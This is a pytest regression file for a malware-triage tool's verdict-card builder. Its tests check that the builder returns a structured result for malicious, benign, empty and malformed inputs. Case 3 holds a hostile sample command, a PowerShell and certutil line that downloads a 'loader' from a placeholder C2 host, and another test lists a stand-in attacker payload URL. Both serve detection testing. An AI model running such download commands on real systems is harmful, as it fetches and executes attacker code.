"""P0.1 regression — `verdict_card` must NEVER be null.

Locks the Feb-2026 hardening of `evidence_extractor.build_verdict_card`:

  1. Every call returns a structured dict — never `None`.
  2. Required keys are present: `label`, `verdict`, `confidence`,
     `risk_score`, `reason`, `indicators`, `recommended_action`.
  3. Findings-aware classification: MITRE-heavy / LOLBIN / URL / family
     match payloads escalate to Suspicious/Malicious even when the
     decoded output lacks a raw byte-level artifact (no MZ, no
     `http://` literal).
  4. Exception safety — even with adversarial inputs (bad chain shape,
     None-y fields), the function returns the `_fallback_card` instead
     of raising.
"""
from __future__ import annotations

import pytest

from evidence_extractor import build_verdict_card, _fallback_card


REQUIRED_KEYS = ("label", "verdict", "confidence", "risk_score",
                  "reason", "indicators", "recommended_action")


def _assert_shape(card):
    assert card is not None, "verdict_card must never be None"
    assert isinstance(card, dict)
    for k in REQUIRED_KEYS:
        assert k in card, f"missing required key: {k}"
    # Numeric fields must be non-null ints
    assert isinstance(card["confidence"], int)
    assert isinstance(card["risk_score"], int)
    # String fields must be non-null strings
    for k in ("label", "verdict", "reason", "recommended_action"):
        assert isinstance(card[k], str)
        assert card[k], f"{k} must be non-empty"


# ── Case 1 · MITRE-only findings ────────────────────────────────────────
def test_mitre_only_findings_escalate_to_suspicious():
    findings = {
        "mitre_techniques": [
            {"id": "T1059.001", "technique": "PowerShell"},
            {"id": "T1105",     "technique": "Ingress Tool Transfer"},
            {"id": "T1027",     "technique": "Obfuscated Files or Information"},
            {"id": "T1140",     "technique": "Deobfuscate/Decode Files"},
        ],
    }
    card = build_verdict_card(
        input_text="stub", output_text="Get-Process | Where-Object Name",
        chain=[{"op": "base64-decode"}], corrupted_container=None,
        findings=findings,
    )
    _assert_shape(card)
    assert card["label"] in ("Suspicious", "Malicious")
    assert card["confidence"] >= 40


# ── Case 2 · IOC-only findings (URL) ─────────────────────────────────────
def test_ioc_url_findings_escalate_to_malicious():
    findings = {
        "iocs": {"urls": ["http://attacker.example.com/payload.exe"]},
    }
    card = build_verdict_card(
        input_text="stub", output_text="script content",
        chain=[{"op": "base64-decode"}], corrupted_container=None,
        findings=findings,
    )
    _assert_shape(card)
    assert card["label"] == "Malicious"
    assert card["confidence"] >= 60


# ── Case 3 · LOLBIN + URL + MITRE (IncidentL sample class) ─────────────
def test_incidentl_class_full_findings_are_malicious():
    findings = {
        "mitre_techniques": [
            {"id": f"T{i:04d}"} for i in range(1000, 1007)   # 7 techniques
        ],
        "lolbas":  [{"binary": "certutil.exe"}, {"binary": "powershell.exe"}],
        "iocs":    {"urls": ["http://c2.example/loader"],
                     "domains": ["c2.example"]},
    }
    card = build_verdict_card(
        input_text="stub",
        output_text=("powershell -c certutil -urlcache -f "
                     "http://c2.example/loader out.exe"),
        chain=[{"op": "base64-decode"}, {"op": "url-decode"}],
        corrupted_container=None, findings=findings,
    )
    _assert_shape(card)
    assert card["label"] == "Malicious"
    # Multiple hard indicators → confidence in the top tier.
    assert card["confidence"] >= 80


# ── Case 4 · Benign sample ──────────────────────────────────────────────
def test_benign_sample_returns_benign_card():
    card = build_verdict_card(
        input_text="hello world",
        output_text="hello world",
        chain=[], corrupted_container=None, findings=None,
    )
    _assert_shape(card)
    # Chain empty + no positive indicators → Undecoded (correct: nothing to say)
    assert card["label"] in ("Undecoded", "Benign")


# ── Case 5 · Empty input ────────────────────────────────────────────────
def test_empty_input_returns_structured_card():
    card = build_verdict_card(
        input_text="", output_text="", chain=[], corrupted_container=None,
    )
    _assert_shape(card)
    assert card["confidence"] == 0


# ── Case 6 · Adversarial chain shape (missing keys) ────────────────────
def test_malformed_chain_never_raises_returns_fallback():
    # Steps missing "op" key would previously cascade to the caller's
    # except-block and produce verdict_card=None.
    card = build_verdict_card(
        input_text="x", output_text="y",
        chain=[{"args": {}}, None, {"op": "base64-decode"}],  # mixed
        corrupted_container=None,
    )
    _assert_shape(card)


# ── Case 7 · Adversarial findings shape ─────────────────────────────────
def test_malformed_findings_never_raise():
    card = build_verdict_card(
        input_text="x", output_text="y", chain=[{"op": "base64-decode"}],
        corrupted_container=None,
        findings={"mitre_techniques": ["not-a-dict", 42, None],
                  "iocs": "not-a-dict",   # WRONG TYPE — must not crash
                  "lolbas": [None, {"name": "cmd.exe"}]},
    )
    _assert_shape(card)


# ── Case 8 · Fallback shape lock ────────────────────────────────────────
def test_fallback_card_has_required_shape():
    card = _fallback_card("test reason")
    _assert_shape(card)
    assert card["label"] == "Inconclusive"
    assert card["confidence"] == 0
    assert card["risk_score"] == 0
    assert "test reason" in card["reason"]


# ── Case 9 · Corrupted container with salvage ──────────────────────────
def test_corrupted_container_still_returns_card():
    card = build_verdict_card(
        input_text="x", output_text="",
        chain=[{"op": "gzip-decompress"}],
        corrupted_container={"kind": "gzip", "reason": "CRC mismatch",
                              "salvaged": "recovered plaintext here"},
    )
    _assert_shape(card)
    assert card["label"] == "Corrupted"


# ── Case 10 · No findings — chain only (Suspicious) ─────────────────────
def test_chain_only_produces_suspicious_card():
    card = build_verdict_card(
        input_text="stub", output_text="decoded text",
        chain=[{"op": "base64-decode"}, {"op": "url-decode"}],
        corrupted_container=None,
    )
    _assert_shape(card)
    assert card["label"] in ("Suspicious", "Malicious", "Benign")
